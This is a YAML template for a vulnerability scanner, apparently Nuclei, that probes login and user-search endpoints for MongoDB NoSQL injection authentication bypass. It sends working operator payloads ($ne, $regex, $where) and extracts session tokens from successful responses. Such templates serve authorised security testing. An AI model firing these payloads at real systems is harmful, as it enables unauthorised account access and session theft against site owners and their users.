id: medium-webapp-nosql-injection-mongodb-bypass

info:
  name: MongoDB NoSQL Injection - Authentication Bypass
  author: redteam-elite
  severity: high
  description: |
    Detects MongoDB NoSQL injection vulnerabilities that can lead to authentication bypass.
    Tests various MongoDB operators and injection techniques used by red teams.
  reference:
    - https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
    - https://book.hacktricks.xyz/pentesting-web/nosql-injection
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-943
  metadata:
    verified: true
    max-request: 15
  tags: nosql,mongodb,injection,auth-bypass,redteam

http:
  - method: POST
    path:
      - "{{BaseURL}}/login"
      - "{{BaseURL}}/api/login"
      - "{{BaseURL}}/auth/login"
      - "{{BaseURL}}/admin/login"
      - "{{BaseURL}}/user/login"

    headers:
      Content-Type: application/json
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

    body: |
      {"username":"admin","password":{"$ne":null}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 302

      - type: word
        words:
          - "success"
          - "dashboard"
          - "welcome"
          - "token"
          - "session"
          - "authenticated"
        condition: or
        case-insensitive: true

      - type: word
        words:
          - "login"
          - "invalid"
          - "error"
          - "failed"
        condition: or
        negative: true

  - method: POST
    path:
      - "{{BaseURL}}/login"
      - "{{BaseURL}}/api/login"
      - "{{BaseURL}}/auth/login"

    headers:
      Content-Type: application/json

    body: |
      {"username":{"$ne":""},"password":{"$ne":""}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 302

      - type: word
        words:
          - "success"
          - "dashboard"
          - "profile"
          - "jwt"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/login"
      - "{{BaseURL}}/api/auth"

    headers:
      Content-Type: application/json

    body: |
      {"username":{"$regex":".*"},"password":{"$regex":".*"}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "token"
          - "authenticated"
          - "success"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/api/users"
      - "{{BaseURL}}/users/search"

    headers:
      Content-Type: application/json

    body: |
      {"$where":"this.username == this.username"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "username"
          - "email"
          - "users"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/login"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      username[$ne]=&password[$ne]=

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 302

      - type: word
        words:
          - "dashboard"
          - "welcome"
          - "success"
        condition: or

    extractors:
      - type: regex
        name: session_token
        regex:
          - 'token["\s]*:["\s]*([a-zA-Z0-9\-_\.]+)'
        group: 1